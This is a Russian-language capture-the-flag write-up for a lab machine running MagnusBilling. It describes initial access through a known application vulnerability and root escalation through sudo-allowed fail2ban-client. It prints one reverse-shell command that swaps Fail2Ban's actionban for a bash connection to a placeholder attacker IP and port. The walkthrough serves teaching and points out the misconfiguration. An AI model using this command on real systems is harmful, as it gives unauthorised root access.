# Billing — MagnusBilling и Fail2Ban

## Разведка

Начал со сканирования SSH:

![Результат Nmap-сканирования SSH](../images/Pasted%20image%2020260317133224.png)

На веб-сервере обнаружил систему MagnusBilling.

![Главная страница MagnusBilling](../images/Pasted%20image%2020260317133256.png)

В открытом `README.md` нашёл информацию о версии приложения.

![Версия MagnusBilling в README.md](../images/Pasted%20image%2020260317134033.png)

## Эксплуатация веб-приложения

После определения версии проверил известные уязвимости MagnusBilling и получил первоначальный доступ.

![Подготовка эксплуатации MagnusBilling](../images/Pasted%20image%2020260317134355.png)

![Результат эксплуатации](../images/Pasted%20image%2020260317134535.png)

## Fail2Ban

В системе обнаружил разрешение на запуск `fail2ban-client`.

Fail2Ban обычно блокирует IP-адреса после серии неудачных попыток входа. Если пользователь может менять действие `actionban`, это действие можно заменить на собственную команду.

![Разрешения для fail2ban-client](../images/Pasted%20image%2020260317134626.png)

![Информация о fail2ban-client](../images/Pasted%20image%2020260317134831.png)

Подготовил reverse-shell payload в качестве действия блокировки:

```bash
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban \
  "/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'"
```

После этого инициировал событие, которое должно было вызвать блокировку SSH-адреса.

![Изменение actionban для SSH-jail](../images/Pasted%20image%2020260317135003.png)

![Подготовка обратного соединения](../images/Pasted%20image%2020260317135459.png)

Получил первый флаг и затем заменил неудобную Meterpreter-сессию на обычный shell.

![Первый флаг](../images/Pasted%20image%2020260317144438.png)

![Получение обычного shell](../images/Pasted%20image%2020260317144503.png)

Поскольку Fail2Ban работает с правами root, изменённое действие выполнилось также с root-привилегиями.

![Root-shell после срабатывания Fail2Ban](../images/Pasted%20image%2020260317144518.png)

## Итог

1. Определил MagnusBilling и его версию.
2. Получил первоначальный доступ через уязвимость приложения.
3. Обнаружил возможность управлять `fail2ban-client`.
4. Заменил `actionban` на reverse-shell команду.
5. Получил root-shell через процесс Fail2Ban.

Главная ошибка конфигурации — разрешение обычному пользователю менять команды, которые выполняются сервисом Fail2Ban от имени root.
